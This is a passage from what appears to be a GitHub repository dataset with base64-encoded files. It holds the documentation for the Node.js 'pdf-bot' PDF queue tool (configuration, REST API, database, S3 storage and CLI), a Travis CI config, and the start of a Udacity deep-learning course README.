IGEgd2FpdCBzaW1wbHkgY29uZmlndXJlIHRoZSBgZ2VuZXJhdG9yYCBrZXkg
aW4geW91ciBjb25maWd1cmF0aW9uLiBCZWxvdyBhcmUgYSBmZXcgZXhhbXBs
ZXMuCgoqKldhaXQgZm9yIDUgc2Vjb25kcyoqCgpgYGBqYXZhc2NyaXB0CnZh
ciBodG1sUGRmID0gcmVxdWlyZSgnaHRtbC1wZGYtY2hyb21lJykKCm1vZHVs
ZS5leHBvcnRzID0gewogIGFwaTogewogICAgdG9rZW46ICdhcGktdG9rZW4n
CiAgfSwKICAvLyBodG1sLXBkZi1jaHJvbWUgb3B0aW9ucwogIGdlbmVyYXRv
cjogewogICAgY29tcGxldGlvblRyaWdnZXI6IG5ldyBodG1sUGRmLkNvbXBs
ZXRpb25UcmlnZ2VyLlRpbWVyKDUwMDApLCAvLyB3YWl0cyBmb3IgNSBzZWMK
ICB9LAogIHdlYmhvb2s6IHsKICAgIHNlY3JldDogJzEyMzQnLAogICAgdXJs
OiAnaHR0cDovL2xvY2FsaG9zdDozMDAwL3dlYmhvb2tzL3BkZicKICB9Cn0K
YGBgCgoqKldhaXQgZm9yIGV2ZW50KioKCmBgYGphdmFzY3JpcHQKdmFyIGh0
bWxQZGYgPSByZXF1aXJlKCdodG1sLXBkZi1jaHJvbWUnKQoKbW9kdWxlLmV4
cG9ydHMgPSB7CiAgYXBpOiB7CiAgICB0b2tlbjogJ2FwaS10b2tlbicKICB9
LAogIC8vIGh0bWwtcGRmLWNocm9tZSBvcHRpb25zCiAgZ2VuZXJhdG9yOiB7
CiAgICBjb21wbGV0aW9uVHJpZ2dlcjogbmV3IGh0bWxQZGYuQ29tcGxldGlv
blRyaWdnZXIuRXZlbnQoCiAgICAgICdteUV2ZW50JywgLy8gbmFtZSBvZiB0
aGUgZXZlbnQgdG8gbGlzdGVuIGZvcgogICAgICAnI215RWxlbWVudCcsIC8v
IG9wdGlvbmFsIERPTSBlbGVtZW50IENTUyBzZWxlY3RvciB0byBsaXN0ZW4g
b24sIGRlZmF1bHRzIHRvIGJvZHkKICAgICAgNTAwMCAvLyBvcHRpb25hbCB0
aW1lb3V0IChtaWxsaXNlY29uZHMpCiAgICApCiAgfSwKICB3ZWJob29rOiB7
CiAgICBzZWNyZXQ6ICcxMjM0JywKICAgIHVybDogJ2h0dHA6Ly9sb2NhbGhv
c3Q6MzAwMC93ZWJob29rcy9wZGYnCiAgfQp9CmBgYAoKSW4geW91ciBKYXZh
c2NyaXB0IHRyaWdnZXIgdGhlIGV2ZW50IHdoZW4gcmVuZGVyaW5nIGlzIGNv
bXBsZXRlCgpgYGBqYXZhc2NyaXB0CmRvY3VtZW50LmdldEVsZW1lbnRCeUlk
KCdteUVsZW1lbnQnKS5kaXNwYXRjaEV2ZW50KG5ldyBDdXN0b21FdmVudCgn
bXlFdmVudCcpKTsKYGBgCgoqKldhaXQgZm9yIHZhcmlhYmxlKioKCmBgYGph
dmFzY3JpcHQKdmFyIGh0bWxQZGYgPSByZXF1aXJlKCdodG1sLXBkZi1jaHJv
bWUnKQoKbW9kdWxlLmV4cG9ydHMgPSB7CiAgYXBpOiB7CiAgICB0b2tlbjog
J2FwaS10b2tlbicKICB9LAogIC8vIGh0bWwtcGRmLWNocm9tZSBvcHRpb25z
CiAgZ2VuZXJhdG9yOiB7CiAgICBjb21wbGV0aW9uVHJpZ2dlcjogbmV3IGh0
bWxQZGYuQ29tcGxldGlvblRyaWdnZXIuVmFyaWFibGUoCiAgICAgICdteVZh
ck5hbWUnLCAvLyBvcHRpb25hbCwgbmFtZSBvZiB0aGUgdmFyaWFibGUgdG8g
d2FpdCBmb3IuICBEZWZhdWx0cyB0byAnaHRtbFBkZkRvbmUnCiAgICAgIDUw
MDAgLy8gb3B0aW9uYWwsIHRpbWVvdXQgKG1pbGxpc2Vjb25kcykKICAgICkK
ICB9LAogIHdlYmhvb2s6IHsKICAgIHNlY3JldDogJzEyMzQnLAogICAgdXJs
OiAnaHR0cDovL2xvY2FsaG9zdDozMDAwL3dlYmhvb2tzL3BkZicKICB9Cn0K
YGBgCgpJbiB5b3VyIEphdmFzY3JpcHQgc2V0IHRoZSB2YXJpYWJsZSB3aGVu
IHRoZSByZW5kZXJpbmcgaXMgY29tcGxldGUKCmBgYGphdmFzY3JpcHQKd2lu
ZG93Lm15VmFyTmFtZSA9IHRydWU7CmBgYAoKW1lvdSBjYW4gZmluZCBtb3Jl
IGNvbXBsZXRpb24gdHJpZ2dlcnMgaW4gaHRtbC1wZGYtY2hyb21lJ3MgZG9j
dW1lbnRhdGlvbl0oaHR0cHM6Ly9naXRodWIuY29tL3dlc3R5OTIvaHRtbC1w
ZGYtY2hyb21lI3RyaWdnZXItcmVuZGVyLWNvbXBsZXRpb24pCgojIyBBUEkK
CkJlbG93IGFyZSBnaXZlbiB0aGUgZW5kcG9pbnRzIHRoYXQgYXJlIGV4cG9z
ZWQgYnkgYHBkZi1zZXJ2ZXJgJ3MgUkVTVCBBUEkKCiMjIyBQdXNoIFVSTCB0
byBxdWV1ZTogUE9TVCAvCgprZXkgfCB0eXBlIHwgcmVxdWlyZWQgfCBkZXNj
cmlwdGlvbgotLS0gfCAtLS0tIHwgLS0tLS0tLS0gfCAtLS0tLS0tLS0tLQp1
cmwgfCBzdHJpbmcgfCB5ZXMgfCBUaGUgVVJMIHRvIGdlbmVyYXRlIGEgUERG
IGZyb20KbWV0YSB8IG9iamVjdCB8IHwgT3B0aW9uYWwgbWV0YSBkYXRhIG9i
amVjdCB0byBzZW5kIGJhY2sgdG8gdGhlIHdlYmhvb2sgdXJsCgojIyMjIEV4
YW1wbGUKCmBgYGJhc2gKY3VybCAtWCBQT1NUIC1IICdBdXRob3JpemF0aW9u
OiBCZWFyZXIgYXBpLXRva2VuJyAtSCAnQ29udGVudC1UeXBlOiBhcHBsaWNh
dGlvbi9qc29uJyBodHRwOi8vcGRmLWJvdC5jb20vIC1kICcKICB7CiAgICAi
dXJsIjoiaHR0cHM6Ly9lc2JlbnAuZ2l0aHViLmlvIiwKICAgICJtZXRhIjp7
CiAgICAgICJ0eXBlIjoiaW52b2ljZSIsCiAgICAgICJpZCI6MQogICAgfQog
IH0nCmBgYAoKIyMgRGF0YWJhc2UKCiMjIyBMb3dEQiAoZmlsZS1kYXRhYmFz
ZSkgKGRlZmF1bHQpCgpJZiB5b3UgaGF2ZSBsb3cgY29udXJyZW5jeSAocnVu
IGEgam9iIGV2ZXJ5IG5vdyBhbmQgdGhlbikgeW91IGNhbiB1c2UgdGhlIGRl
ZmF1bHQgZGF0YWJhc2UgZHJpdmVyIHRoYXQgdXNlcyBMb3dEQi4KCmBgYGph
dmFzY3JpcHQKdmFyIExvd0RCID0gcmVxdWlyZSgncGRmLWJvdC9zcmMvZGIv
bG93ZGInKQoKbW9kdWxlLmV4cG9ydHMgPSB7CiAgYXBpOiB7CiAgICB0b2tl
bjogJ2FwaS10b2tlbicKICB9LAogIGRiOiBMb3dEQih7CiAgICBsb3dEYk9w
dGlvbnM6IHt9LAogICAgcGF0aDogJycgLy8gZGVmYXVsdHMgdG8gJHN0b3Jh
Z2VQYXRoL2RiL2RiLmpzb24KICB9KSwKICB3ZWJob29rOiB7CiAgICBzZWNy
ZXQ6ICcxMjM0JywKICAgIHVybDogJ2h0dHA6Ly9sb2NhbGhvc3Q6MzAwMC93
ZWJob29rcy9wZGYnCiAgfQp9CmBgYAoKIyMjIFBvc3RncmVTUUwKCmBgYGph
dmFzY3JpcHQKdmFyIHBnc3FsID0gcmVxdWlyZSgncGRmLWJvdC9zcmMvZGIv
cGdzcWwnKQoKbW9kdWxlLmV4cG9ydHMgPSB7CiAgYXBpOiB7CiAgICB0b2tl
bjogJ2FwaS10b2tlbicKICB9LAogIGRiOiBwZ3NxbCh7CiAgICBkYXRhYmFz
ZTogJ3BkZmJvdCcsCiAgICB1c2VybmFtZTogJ3BkZmJvdCcsCiAgICBwYXNz
d29yZDogJ3BkZmJvdCcsCiAgICBwb3J0OiA1NDMyCiAgfSksCiAgd2ViaG9v
azogewogICAgc2VjcmV0OiAnMTIzNCcsCiAgICB1cmw6ICdodHRwOi8vbG9j
YWxob3N0OjMwMDAvd2ViaG9va3MvcGRmJwogIH0KfQpgYGAKCk9wdGlvbmFs
bHksIHlvdSBjYW4gc3BlY2lmeSBhIGRhdGFiYXNlIHVybCBieSBzcGVjaWZ5
aW5nIGEgYGNvbm5lY3Rpb25TdHJpbmdgLgoKVG8gaW5zdGFsbCB0aGUgbmVj
ZXNzYXJ5IGRhdGFiYXNlIHRhYmxlcywgcnVuIGBkYjptaWdyYXRlYC4gWW91
IGNhbiBhbHNvIGRlc3Ryb3kgdGhlIGRhdGFiYXNlIGJ5IHJ1bm5pbmcgYGRi
OmRlc3Ryb3lgLgoKIyMgU3RvcmFnZQoKQ3VycmVudGx5IGBwZGYtYm90YCBj
b21lcyBidW5kbGVkIHdpdGggYnVpbGQtaW4gc3VwcG9ydCBmb3Igc3Rvcmlu
ZyBQREZzIG9uIEFtYXpvbiBTMy4KCltGZWVsIGZyZWUgdG8gY29udHJpYnV0
ZSBhIFBSIGlmIHlvdSB3YW50IHRvIHNlZSBvdGhlciBzdG9yYWdlIHBsdWdp
bnMgaW4gYHBkZi1ib3RgXShodHRwczovL2dpdGh1Yi5jb20vZXNiZW5wL3Bk
Zi1ib3QvY29tcGFyZSkhCgojIyMgQW1hem9uIFMzCgpUbyBpbnN0YWxsIFMz
IHN0b3JhZ2UgYWRkIGEga2V5IHRvIHRoZSBgc3RvcmFnZWAgY29uZmlndXJh
dGlvbi4gTm90aWNlLCB5b3UgY2FuIGFkZCBhcyBtYW55IGRpZmZlcmVudCBs
b2NhdGlvbnMgeW91IHdhbnQgYnkgZ2l2aW5nIHRoZW0gZGlmZmVyZW50IGtl
eXMuCgpgYGBqYXZhc2NyaXB0CnZhciBjcmVhdGVTM0NvbmZpZyA9IHJlcXVp
cmUoJ3BkZi1ib3Qvc3JjL3N0b3JhZ2UvczMnKQoKbW9kdWxlLmV4cG9ydHMg
PSB7CiAgYXBpOiB7CiAgICB0b2tlbjogJ2FwaS10b2tlbicKICB9LAogIHN0
b3JhZ2U6IHsKICAgICdteV9zMyc6IGNyZWF0ZVMzQ29uZmlnKHsKICAgICAg
YnVja2V0OiAnW1lPVVIgQlVDS0VUIE5BTUVdJywKICAgICAgYWNjZXNzS2V5
SWQ6ICdbWU9VUiBBQ0NFU1MgS0VZIElEXScsCiAgICAgIHJlZ2lvbjogJ1tZ
T1VSIFJFR0lPTl0nLAogICAgICBzZWNyZXRBY2Nlc3NLZXk6ICdbWU9VUiBT
RUNSRVQgQUNDRVNTIEtFWV0nCiAgICB9KQogIH0sCiAgd2ViaG9vazogewog
ICAgc2VjcmV0OiAnMTIzNCcsCiAgICB1cmw6ICdodHRwOi8vbG9jYWxob3N0
OjMwMDAvd2ViaG9va3MvcGRmJwogIH0KfQoKYGBgCgojIyBPcHRpb25zCgpg
YGBqYXZhc2NyaXB0CnZhciBkZWNheVNjaGVkdWxlID0gWwogIDEwMDAgKiA2
MCwgLy8gMSBtaW51dGUKICAxMDAwICogNjAgKiAzLCAvLyAzIG1pbnV0ZXMK
ICAxMDAwICogNjAgKiAxMCwgLy8gMTAgbWludXRlcwogIDEwMDAgKiA2MCAq
IDMwLCAvLyAzMCBtaW51dGVzCiAgMTAwMCAqIDYwICogNjAgLy8gMSBob3Vy
Cl07Cgptb2R1bGUuZXhwb3J0cyA9IHsKICAvLyBUaGUgc2V0dGluZ3Mgb2Yg
dGhlIEFQSQogIGFwaTogewogICAgLy8gVGhlIHBvcnQgeW91ciBleHByZXNz
LmpzIGluc3RhbmNlIGxpc3RlbnMgdG8gcmVxdWVzdHMgZnJvbS4gKGRlZmF1
bHQ6IDMwMDApCiAgICBwb3J0OiAzMDAwLAogICAgLy8gU3Bhd24gY29tbWFu
ZCB3aGVuIGEgam9iIGhhcyBiZWVuIHB1c2hlZCB0byB0aGUgQVBJCiAgICBw
b3N0UHVzaENvbW1hbmQ6IFsnL2hvbWUvdXNlci8ubnBtLWdsb2JhbC9iaW4v
cGRmLWJvdCcsIFsnLWMnLCAnLi9wZGYtYm90LmNvbmZpZy5qcycsICdzaGlm
dDphbGwnXV0sCiAgICAvLyBUaGUgdG9rZW4gdXNlZCB0byB2YWxpZGF0ZSBy
ZXF1ZXN0cyB0byB5b3VyIEFQSS4gTm90IHJlcXVpcmVkLCBidXQgMTAwJSBy
ZWNvbW1lbmRlZC4KICAgIHRva2VuOiAnYXBpLXRva2VuJwogIH0sCiAgZGI6
IExvd0RCKCksIC8vIHNlZSBvdGhlciBkcml2ZXJzIHVuZGVyIERhdGFiYXNl
CiAgLy8gaHRtbC1wZGYtY2hyb21lCiAgZ2VuZXJhdG9yOiB7CiAgICAvLyBU
cmlnZ2VycyB0aGF0IHNwZWNpZnkgd2hlbiB0aGUgUERGIHNob3VsZCBiZSBn
ZW5lcmF0ZWQKICAgIGNvbXBsZXRpb25UcmlnZ2VyOiBuZXcgaHRtbFBkZi5D
b21wbGV0aW9uVHJpZ2dlci5UaW1lcigxMDAwKSwgLy8gd2FpdHMgZm9yIDEg
c2VjCiAgICAvLyBUaGUgcG9ydCB0byBsaXN0ZW4gZm9yIENocm9tZSAoZGVm
YXVsdDogOTIyMikKICAgIHBvcnQ6IDkyMjIKICB9LAogIHF1ZXVlOiB7CiAg
ICAvLyBIb3cgZnJlcXVlbnQgc2hvdWxkIHBkZi1ib3QgcmV0cnkgZmFpbGVk
IGdlbmVyYXRpb25zPwogICAgLy8gKGRlZmF1bHQ6IDEgbWluLCAzIG1pbiwg
MTAgbWluLCAzMCBtaW4sIDYwIG1pbikKICAgIGdlbmVyYXRpb25SZXRyeVN0
cmF0ZWd5OiBmdW5jdGlvbihqb2IsIHJldHJpZXMpIHsKICAgICAgcmV0dXJu
IGRlY2F5U2NoZWR1bGVbcmV0cmllcyAtIDFdID8gZGVjYXlTY2hlZHVsZVty
ZXRyaWVzIC0gMV0gOiAwCiAgICB9LAogICAgLy8gSG93IG1hbnkgdGltZXMg
c2hvdWxkIHBkZi1ib3QgdHJ5IHRvIGdlbmVyYXRlIGEgUERGPwogICAgLy8g
KGRlZmF1bHQ6IDUpCiAgICBnZW5lcmF0aW9uTWF4VHJpZXM6IDUsCiAgICAv
LyBIb3cgbWFueSBnZW5lcmF0aW9ucyB0byBydW4gYXQgdGhlIHNhbWUgdGlt
ZSB3aGVuIHVzaW5nIHNoaWZ0OmFsbAogICAgcGFyYWxsZWxpc206IDQsCiAg
ICAvLyBIb3cgZnJlcXVlbnQgc2hvdWxkIHBkZi1ib3QgcmV0cnkgZmFpbGVk
IHdlYmhvb2sgcGluZ3M/CiAgICAvLyAoZGVmYXVsdDogMSBtaW4sIDMgbWlu
LCAxMCBtaW4sIDMwIG1pbiwgNjAgbWluKQogICAgd2ViaG9va1JldHJ5U3Ry
YXRlZ3k6IGZ1bmN0aW9uKGpvYiwgcmV0cmllcykgewogICAgICByZXR1cm4g
ZGVjYXlTY2hlZHVsZVtyZXRyaWVzIC0gMV0gPyBkZWNheVNjaGVkdWxlW3Jl
dHJpZXMgLSAxXSA6IDAKICAgIH0sCiAgICAvLyBIb3cgbWFueSB0aW1lcyBz
aG91bGQgcGRmLWJvdCB0cnkgdG8gcGluZyBhIHdlYmhvb2s/CiAgICAvLyAo
ZGVmYXVsdDogNSkKICAgIHdlYmhvb2tNYXhUcmllczogNQogIH0sCiAgc3Rv
cmFnZTogewogICAgJ3MzJzogY3JlYXRlUzNDb25maWcoewogICAgICBidWNr
ZXQ6ICcnLAogICAgICBhY2Nlc3NLZXlJZDogJycsCiAgICAgIHJlZ2lvbjog
JycsCiAgICAgIHNlY3JldEFjY2Vzc0tleTogJycKICAgIH0pCiAgfSwKICB3
ZWJob29rOiB7CiAgICAvLyBUaGUgcHJlZml4IHRvIGFkZCB0byBhbGwgcGRm
LWJvdCBoZWFkZXJzIG9uIHRoZSB3ZWJob29rIHJlc3BvbnNlLgogICAgLy8g
SS5lLiBYLVBERi1UcmFuc2FjdGlvbiBhbmQgWC1QREYtU2lnbmF0dXJlLiAo
ZGVmYXVsdDogWC1QREYtKQogICAgaGVhZGVyTmFtZXNwYWNlOiAnWC1QREYt
JywKICAgIC8vIEV4dHJhIHJlcXVlc3Qgb3B0aW9ucyB0byBhZGQgdG8gdGhl
IFdlYmhvb2sgcGluZy4KICAgIHJlcXVlc3RPcHRpb25zOiB7CgogICAgfSwK
ICAgIC8vIFRoZSBzZWNyZXQgdXNlZCB0byBnZW5lcmF0ZSB0aGUgaG1hYy1z
aGExIHNpZ25hdHVyZSBoYXNoLgogICAgLy8gIU5vdCByZXF1aXJlZCwgYnV0
IHNob3VsZCBkZWZpbml0ZWx5IGJlIGluY2x1ZGVkIQogICAgc2VjcmV0OiAn
MTIzNCcsCiAgICAvLyBUaGUgZW5kcG9pbnQgdG8gc2VuZCBQREYgbWVzc2Fn
ZXMgdG8uCiAgICB1cmw6ICdodHRwOi8vbG9jYWxob3N0OjMwMDAvd2ViaG9v
a3MvcGRmJwogIH0KfQpgYGAKCiMjIENMSQoKYHBkZi1ib3RgIGNvbWVzIHdp
dGggYSBmdWxsIENMSSBpbmNsdWRlZCEgVXNlIGAtY2AgdG8gcGFzcyBhIGNv
bmZpZ3VyYXRpb24gdG8gYHBkZi1ib3RgLiBZb3UgY2FuIGFsc28gdXNlIGAt
LWhlbHBgIHRvIGdldCBhIGxpc3Qgb2YgYWxsIGNvbW1hbmRzLiBBbiBleGFt
cGxlIGlzIGdpdmVuIGJlbG93LgoKYGBgYmFzaAokIHBkZi1ib3QuanMgLS1j
b25maWcgLi9leGFtcGxlcy9wZGYtYm90LmNvbmZpZy5qcyAtLWhlbHAKCgog
IFVzYWdlOiBwZGYtYm90IFtvcHRpb25zXSBbY29tbWFuZF0KCgogIE9wdGlv
bnM6CgogICAgLVYsIC0tdmVyc2lvbiAgICAgICAgb3V0cHV0IHRoZSB2ZXJz
aW9uIG51bWJlcgogICAgLWMsIC0tY29uZmlnIDxwYXRoPiAgUGF0aCB0byBj
b25maWd1cmF0aW9uIGZpbGUKICAgIC1oLCAtLWhlbHAgICAgICAgICAgIG91
dHB1dCB1c2FnZSBpbmZvcm1hdGlvbgoKCiAgQ29tbWFuZHM6CgogICAgYXBp
ICAgICAgICAgICAgICAgICAgIFN0YXJ0IHRoZSBBUEkKICAgIGRiOm1pZ3Jh
dGUKICAgIGRiOmRlc3Ryb3kKICAgIGluc3RhbGwKICAgIGdlbmVyYXRlIFtq
b2JJRF0gICAgICBHZW5lcmF0ZSBQREYgZm9yIGpvYgogICAgam9icyBbb3B0
aW9uc10gICAgICAgIExpc3QgYWxsIGNvbXBsZXRlZCBqb2JzCiAgICBwaW5n
IFtqb2JJRF0gICAgICAgICAgQXR0ZW1wdCB0byBwaW5nIHdlYmhvb2sgZm9y
IGpvYgogICAgcGluZzpyZXRyeS1mYWlsZWQKICAgIHBpbmdzIFtqb2JJZF0g
ICAgICAgICBMaXN0IHBpbmdzIGZvciBhIGpvYgogICAgcHVyZ2UgW29wdGlv
bnNdICAgICAgIFdpbGwgcmVtb3ZlIGFsbCBjb21wbGV0ZWQgam9icwogICAg
cHVzaCBbb3B0aW9uc10gW3VybF0gIFB1c2ggbmV3IGpvYiB0byB0aGUgcXVl
dWUKICAgIHNoaWZ0ICAgICAgICAgICAgICAgICBSdW4gdGhlIG5leHQgam9i
IGluIHRoZSBxdWV1ZQogICAgc2hpZnQ6YWxsICAgICAgICAgICAgIFJ1biBh
bGwgdW5maW5pc2hlZCBqb2JzIGluIHRoZSBxdWV1ZQpgYGAKCiMjIERlYnVn
IG1vZGUKCmBwZGYtYm90YCB1c2VzIGBkZWJ1Z2AgZm9yIGRlYnVnIG1lc3Nh
Z2VzLiBZb3UgY2FuIHR1cm4gb24gZGVidWdnaW5nIGJ5IHNldHRpbmcgdGhl
IGVudmlyb25tZW50IHZhcmlhYmxlIGBERUJVRz1wZGY6KmAgbGlrZSBzbwoK
YGBgYmFzaApERUJVRz1wZGY6KiBwZGYtYm90IGpvYnMKYGBgCgojIyBUZXN0
cwoKYGBgYmFzaAokIG5wbSBydW4gdGVzdApgYGAKCiMjIElzc3VlcwoKW1Bs
ZWFzZSByZXBvcnQgaXNzdWVzIHRvIHRoZSBpc3N1ZSB0cmFja2VyXShodHRw
czovL2dpdGh1Yi5jb20vZXNiZW5wL3BkZi1ib3QvaXNzdWVzL25ldykKCiMj
IExpY2Vuc2UKClRoZSBNSVQgTGljZW5zZSAoTUlUKS4gUGxlYXNlIHNlZSBb
TGljZW5zZSBGaWxlXShodHRwczovL2dpdGh1Yi5jb20vZXNiZW5wL3BkZi1i
b3QvYmxvYi9tYXN0ZXIvTElDRU5TRSkgZm9yIG1vcmUgaW5mb3JtYXRpb24u
Cg==
",,"bGFuZ3VhZ2U6IG5vZGVfanMKbm9kZV9qczoKICAtICJub2RlIgpzY3JpcHQ6
CiAgLSBucG0gdGVzdAphZnRlcl9zdWNjZXNzOgogIC0gY2F0IC4vY292ZXJh
Z2UvbGNvdi5pbmZvIHwgLi9ub2RlX21vZHVsZXMvY292ZXJhbGxzL2Jpbi9j
b3ZlcmFsbHMuanMK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'deep-learning-v2-pytorch',147386085,b'Projects and exercises for the latest Deep Learning ND program https://www.udacity.com/course/deep-learning-nanodegree--nd101',b'Jupyter Notebook',79,2389,,2389,False,b'https://api.github.com/repos/udacity/deep-learning-v2-pytorch/forks',"IyBEZWVwIExlYXJuaW5nIChQeVRvcmNoKQoKVGhpcyByZXBvc2l0b3J5IGNv
bnRhaW5zIG1hdGVyaWFsIHJlbGF0ZWQgdG8gVWRhY2l0eSdzIFtEZWVwIExl
YXJuaW5nIE5hbm9kZWdyZWUgcHJvZ3JhbV0oaHR0cHM6Ly93d3cudWRhY2l0
eS5jb20vY291cnNlL2RlZXAtbGVhcm5pbmctbmFub2RlZ3JlZS0tbmQxMDEp
LiBJdCBjb25zaXN0cyBvZiBhIGJ1bmNoIG9mIHR1dG9yaWFsIG5vdGVib29r
cyBmb3IgdmFyaW91cyBkZWVwIGxlYXJuaW5nIHRvcGljcy4gSW4gbW9zdCBj
YXNlcywgdGhlIG5vdGVib29rcyBsZWFkIHlvdSB0aHJvdWdoIGltcGxlbWVu
dGluZyBtb2RlbHMgc3VjaCBhcyBjb252b2x1dGlvbmFsIG5ldHdvcmtzLCBy
ZWN1cnJlbnQgbmV0d29ya3MsIGFuZCBHQU5zLiBUaGVyZSBhcmUgb3RoZXIg
dG9waWNzIGNvdmVyZWQgc3VjaCBhcyB3ZWlnaHQgaW5pdGlhbGl6YXRpb24g
YW5kIGJhdGNoIG5vcm1hbGl6YXRpb24uCgpUaGVyZSBhcmUgYWxzbyBub3Rl
Ym9va3MgdXNlZCBhcyBwcm9qZWN0cyBmb3IgdGhlIE5hbm9kZWdyZWUgcHJv
Z3JhbS4gSW4gdGhlIHByb2dyYW0gaXRzZWxmLCB0aGUgcHJvamVjdHMgYXJl
IHJldmlld2VkIGJ5IHJlYWwgcGVvcGxlIChVZGFjaXR5IHJldmlld2Vycyks
IGJ1dCB0aGUgc3RhcnRpbmcgY29kZSBpcyBhdmFpbGFibGUgaGVyZSwgYXMg
d2VsbC4KCiMjIFRhYmxlIE9mIENvbnRlbnRzCgojIyMgVHV0b3JpYWxzCgoj
IyMgSW50cm9kdWN0aW9uIHRvIE5ldXJhbCBOZXR3b3JrcwoKKiBbSW50cm9k
dWN0aW9uIHRvIE5ldXJhbCBOZXR3b3Jrc10oaHR0cHM6Ly9naXRodWIuY29t
L3VkYWNpdHkvZGVlcC1sZWFybmluZy12Mi1weXRvcmNoL3RyZWUvbWFzdGVy
L2ludHJvLW5ldXJhbC1uZXR3b3Jrcyk6IExlYXJuIGhvdyB0byBpbXBsZW1l
bnQgZ3JhZGllbnQgZGVzY2VudCBhbmQgYXBwbHkgaXQgdG8gcHJlZGljdGlu
ZyBwYXR0ZXJucyBpbiBzdHVkZW50IGFkbWlzc2lvbnMgZGF0YS4KKiBbU2Vu
dGltZW50IEFuYWx5c2lzIHdpdGggTnVtUHldKGh0dHBzOi8vZ2l0aHViLmNv
bS91ZGFjaXR5L2RlZXAtbGVhcm5pbmctdjItcHl0b3JjaC90cmVlL21hc3Rl
ci9zZW50aW1lbnQtYW5hbHlzaXMtbmV0d29yayk6IFtBbmRyZXcgVHJhc2td
KGh0dHA6Ly9pYW10cmFzay5naXRodWIuaW8vKSBsZWFkcyB5b3UgdGhyb3Vn
aCBidWlsZGluZyBhIHNlbnRpbWVudCBhbmFseXNpcyBtb2RlbCwgcHJlZGlj
dGluZyBpZiBzb21lIHRleHQgaXMgcG9zaXRpdmUgb3IgbmVnYXRpdmUuCiog
W0ludHJvZHVjdGlvbiB0byBQeVRvcmNoXShodHRwczovL2dpdGh1Yi5jb20v
dWRhY2l0eS9kZWVwLWxlYXJuaW5nLXYyLXB5dG9yY2gvdHJlZS9tYXN0ZXIv
aW50cm8tdG8tcHl0b3JjaCk6IExlYXJuIGhvdyB0byBidWlsZCBuZXVyYWwg
bmV0d29ya3MgaW4gUHlUb3JjaCBhbmQgdXNlIHByZS10cmFpbmVkIG5ldHdv
cmtzIGZvciBzdGF0ZS1vZi10aGUtYXJ0IGltYWdlIGNsYXNzaWZpZXJzLgoK
IyMjIENvbnZvbHV0aW9uYWwgTmV1cmFsIE5ldHdvcmtzCgoqIFtDb252b2x1
dGlvbmFsIE5ldXJhbCBOZXR3b3Jrc10oaHR0cHM6Ly9naXRodWIuY29tL3Vk
YWNpdHkvZGVlcC1sZWFybmluZy12Mi1weXRvcmNoL3RyZWUvbWFzdGVyL2Nv
bnZvbHV0aW9uYWwtbmV1cmFsLW5ldHdvcmtzKTogVmlzdWFsaXplIHRoZSBv
dXRwdXQgb2YgbGF5ZXJzIHRoYXQgbWFrZSB1cCBhIENOTi4gTGVhcm4gaG93
IHRvIGRlZmluZSBhbmQgdHJhaW4gYSBDTk4gZm9yIGNsYXNzaWZ5aW5nIFtN
TklTVCBkYXRhXShodHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9NTklT
VF9kYXRhYmFzZSksIGEgaGFuZHdyaXR0ZW4gZGlnaXQgZGF0YWJhc2UgdGhh
dCBpcyBub3RvcmlvdXMgaW4gdGhlIGZpZWxkcyBvZiBtYWNoaW5lIGFuZCBk
ZWVwIGxlYXJuaW5nLiBBbHNvLCBkZWZpbmUgYW5kIHRyYWluIGEgQ05OIGZv
ciBjbGFzc2lmeWluZyBpbWFnZXMgaW4gdGhlIFtDSUZBUjEwIGRhdGFzZXRd
KGh0dHBzOi8vd3d3LmNzLnRvcm9udG8uZWR1L35rcml6L2NpZmFyLmh0bWwp
LgoqIFtUcmFuc2ZlciBMZWFybmluZ10oaHR0cHM6Ly9naXRodWIuY29tL3Vk
YWNpdHkvZGVlcC1sZWFybmluZy12Mi1weXRvcmNoL3RyZWUvbWFzdGVyL3Ry
YW5zZmVyLWxlYXJuaW5nKS4gSW4gcHJhY3RpY2UsIG1vc3QgcGVvcGxlIGRv
bid0IHRyYWluIHRoZWlyIG93biBuZXR3b3JrcyBvbiBodWdlIGRhdGFzZXRz
OyB0aGV5IHVzZSAqKnByZS10cmFpbmVkKiogbmV0d29ya3Mgc3VjaCBhcyBW
R0duZXQuIEhlcmUgeW91J2xsIHVzZSBWR0duZXQgdG8gaGVscCBjbGFzc2lm
eSBpbWFnZXMgb2YgZmxvd2VycyB3aXRob3V0IHRyYWluaW5nIGFuIGVuZC10
by1lbmQgbmV0d29yayBmcm9tIHNjcmF0Y2guCiogW1dlaWdodCBJbml0aWFs
aXphdGlvbl0oaHR0cHM6Ly9naXRodWIuY29tL3VkYWNpdHkvZGVlcC1sZWFy
bmluZy12Mi1weXRvcmNoL3RyZWUvbWFzdGVyL3dlaWdodC1pbml0aWFsaXph
dGlvbik6IEV4cGxvcmUgaG93IGluaXRpYWxpemluZyBuZXR3b3JrIHdlaWdo
dHMgYWZmZWN0cyBwZXJmb3JtYW5jZS4KKiBbQXV0b2VuY29kZXJzXShodHRw
czovL2dpdGh1Yi5jb20vdWRhY2l0eS9kZWVwLWxlYXJuaW5nLXYyLXB5dG9y
Y2gvdHJlZS9tYXN0ZXIvYXV0b2VuY29kZXIpOiBCdWlsZCBtb2RlbHMgZm9y
IGltYWdlIGNvbXByZXNzaW9uIGFuZCBkZS1ub2lzaW5nLCB1c2luZyBmZWVk
Zm9yd2FyZCBhbmQgY29udm9sdXRpb25hbCBuZXR3b3JrcyBpbiBQeVRvcmNo
LgoqIFtTdHlsZSBUcmFuc2Zlcl0oaHR0cHM6Ly9naXRodWIuY29tL3VkYWNp
dHkvZGVlcC1sZWFybmluZy12Mi1weXRvcmNoL3RyZWUvbWFzdGVyL3N0eWxl
LXRyYW5zZmVyKTogRXh0cmFjdCBzdHlsZSBhbmQgY29udGVudCBmZWF0dXJl
cyBmcm9tIGltYWdlcywgdXNpbmcgYSBwcmUtdHJhaW5lZCBuZXR3b3JrLiBJ
bXBsZW1lbnQgc3R5bGUgdHJhbnNmZXIgYWNjb3JkaW5nIHRvIHRoZSBwYXBl
